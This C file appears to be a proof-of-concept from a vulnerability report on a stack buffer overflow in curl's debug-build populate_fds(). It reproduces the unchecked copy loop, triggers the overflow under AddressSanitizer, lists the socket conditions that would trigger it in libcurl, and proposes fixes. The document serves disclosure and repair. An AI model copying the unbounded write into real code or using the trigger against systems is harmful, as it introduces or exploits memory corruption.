/*
 * ER_FOLDER_064756 - SF01 PoC
 * Stack buffer overflow in populate_fds() via curl_easy_perform_ev()
 *
 * Affected: lib/easy.c (curl 8.20.0-DEV, DEBUGBUILD only)
 * CWE: CWE-787 (Out-of-bounds Write), CWE-121 (Stack-based Buffer Overflow)
 *
 * Compilation (requires curl built with ENABLE_DEBUG=ON + ASAN):
 *   cmake -S /src/curl -B /build -DENABLE_DEBUG=ON \
 *     -DCMAKE_C_FLAGS='-fsanitize=address -g' -DBUILD_SHARED_LIBS=OFF
 *   cmake --build /build --target libcurl_static
 *
 *   clang -fsanitize=address -g sf01_poc.c \
 *     -I/src/curl/include /build/lib/libcurl-d.a \
 *     -lssl -lcrypto -lz -lpthread -lresolv -o sf01_poc
 *
 * Run:
 *   ASAN_OPTIONS=detect_leaks=0 ./sf01_poc
 *
 * Expected: AddressSanitizer: stack-buffer-overflow
 *           WRITE of size 4 at [fds+64] (past end of fds[4])
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/poll.h>

/*
 * Reproduce the exact structs from lib/easy.c DEBUGBUILD section (lines 359-371):
 *
 *   struct socketmonitor {
 *     struct socketmonitor *next;
 *     struct pollfd socket;
 *   };
 *
 *   struct events {
 *     long ms;
 *     bool msbump;
 *     int num_sockets;
 *     struct socketmonitor *list;
 *     int running_handles;
 *   };
 */
struct socketmonitor {
    struct socketmonitor *next;
    struct pollfd socket;
};

struct events {
    long ms;
    int msbump;
    int num_sockets;
    struct socketmonitor *list;
    int running_handles;
};

/*
 * EXACT reproduction of the vulnerable populate_fds() from lib/easy.c:524-545:
 *
 *   static unsigned int populate_fds(struct pollfd *fds, struct events *ev)
 *   {
 *     unsigned int numfds = 0;
 *     struct pollfd *f;
 *     struct socketmonitor *m;
 *     f = &fds[0];
 *     for(m = ev->list; m; m = m->next) {   // NO BOUNDS CHECK
 *       f->fd = m->socket.fd;
 *       f->events = m->socket.events;
 *       f->revents = 0;
 *       f++;
 *       numfds++;
 *     }
 *     return numfds;
 *   }
 */
static unsigned int populate_fds(struct pollfd *fds, struct events *ev)
{
    unsigned int numfds = 0;
    struct pollfd *f;
    struct socketmonitor *m;

    f = &fds[0];
    for(m = ev->list; m; m = m->next) {   /* NO BOUNDS CHECK */
        f->fd = m->socket.fd;
        f->events = m->socket.events;
        f->revents = 0;
        f++;         /* increments past end of array when numfds >= 4 */
        numfds++;
    }
    return numfds;
}

/*
 * EXACT reproduction of vulnerable allocation site in wait_or_timeout()
 * at lib/easy.c:589:
 *
 *   struct pollfd fds[4];   // FIXED SIZE: only 4 entries
 *   const unsigned int numfds = populate_fds(fds, ev);  // NO SIZE PASSED
 */
static void vulnerable_wait_or_timeout_body(struct events *ev)
{
    struct pollfd fds[4];           /* lib/easy.c line 589 */
    unsigned int numfds = populate_fds(fds, ev);  /* lib/easy.c line 592 */

    printf("  populate_fds returned: %u (overflow if > 4)\n", numfds);
}

int main(void)
{
    printf("=== SF01: populate_fds() Stack Buffer Overflow ===\n");
    printf("Source: lib/easy.c, function wait_or_timeout() + populate_fds()\n");
    printf("Trigger: curl_easy_perform_ev() with 5+ simultaneous sockets\n\n");

    /* Build linked list of 5 socketmonitor entries, simulating what
     * events_socket() callback creates when >4 unique socket fds are
     * monitored by the multi handle during a transfer. */
    struct events ev = {0};
    struct socketmonitor nodes[5];
    memset(nodes, 0, sizeof(nodes));

    for (int i = 0; i < 5; i++) {
        nodes[i].socket.fd = 10 + i;    /* simulated socket fds: 10,11,12,13,14 */
        nodes[i].socket.events = POLLIN;
        nodes[i].socket.revents = 0;
        nodes[i].next = (i < 4) ? &nodes[i+1] : NULL;
    }
    ev.list = &nodes[0];
    ev.num_sockets = 5;  /* note: this field is NEVER checked by populate_fds() */

    printf("  ev->list has 5 entries (wakeup + resolver + conn1 + ftp-ctrl + ftp-data)\n");
    printf("  fds[4] allocated on stack at %p\n", (void*)0 /* placeholder */);
    printf("  Calling populate_fds(fds, ev) - will write beyond fds[3]...\n\n");

    /*
     * This triggers ASAN stack-buffer-overflow:
     * The 5th iteration writes to fds[4] which is past the end of fds[0..3].
     */
    vulnerable_wait_or_timeout_body(&ev);

    printf("  If ASAN is active, the overflow was reported above.\n");
    printf("  Without ASAN, this silently corrupts stack frame data after fds[3].\n\n");

    printf("Real-world trigger via libcurl API:\n");
    printf("  CURL *easy = curl_easy_init();\n");
    printf("  curl_easy_setopt(easy, CURLOPT_URL, \"ftp://host/\");\n");
    printf("  // ... configure for scenario with 5+ concurrent sockets ...\n");
    printf("  curl_easy_perform_ev(easy);  // triggers wait_or_timeout -> populate_fds\n\n");

    printf("Conditions for 5+ concurrent sockets with single easy handle:\n");
    printf("  - Admin wakeup socket: 1\n");
    printf("  - Async DNS resolver sockets (c-ares): 1-2\n");
    printf("  - Happy Eyeballs IPv4 attempt: 1\n");
    printf("  - Happy Eyeballs IPv6 attempt: 1\n");
    printf("  - FTP data channel (PASV): 1\n");
    printf("  Total: 5-6 sockets simultaneously\n\n");

    printf("Fix: In wait_or_timeout(), either:\n");
    printf("  (a) Dynamically allocate fds[] based on ev->num_sockets\n");
    printf("  (b) Add size parameter to populate_fds() and enforce limit\n");
    printf("  (c) Assert numfds <= 4 before the loop\n");

    return 0;
}
